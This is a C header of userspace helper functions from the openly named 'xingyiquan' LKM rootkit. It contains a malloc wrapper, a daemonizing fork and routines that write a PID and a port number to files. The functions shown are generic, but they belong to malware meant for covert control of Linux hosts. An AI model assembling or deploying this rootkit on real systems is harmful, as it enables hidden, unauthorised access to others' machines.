/*
 * userspace functions for xingyiquan lkm rootkit
 *  (c) Copyright by RingLayer All Rights Reserved 
 * Developed by Sw0rdm4n
 * 
 * Official Website : www.ringlayer.net
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 *
DISCLAIMER !!!
Author takes no responsibility for any abuse of this software. 
*/

#ifndef _xingyi_userspace_functions_H_
#define _xingyi_userspace_functions_H_


static inline char *n_malloc(int size) 
{
	char *retme = NULL;
	
	if (size > 0) {
		retme = malloc((size_t)(size + 1));
		if (retme != NULL)
			memset(retme, (int)'\0', (size_t)(size + 1));
	}
	if (retme == NULL)
		return (char *)'\0';
	
	return retme;
}

int daemonize()
{
	pid_t worker_pid;
	
	worker_pid = fork();
	if (worker_pid != 0) 
		exit(0);
	return 0;
}

static int _write_pid_to_file(const char *file_path)
{
	FILE *filp;
	pid_t mypid;
	int retme = 0;

	mypid = getpid();
	filp = fopen(file_path, "w");
	if (filp != NULL) {
		fprintf (filp, "%d\n", (int)mypid);	
		fclose(filp);
		retme = 1;	
	}
	else
		retme = -1;
	
	return retme;
}

static int _log_file(char *path, int port)
{	
	int retval = 0;
	FILE *fp = NULL;

	fp = fopen(path, "w");
	if (fp != NULL)	{
		fprintf (fp, "%d\n", port);	
		fclose(fp);
		retval = 1;	
	}
	else
		retval = -1;

	return retval;	
}

#endif
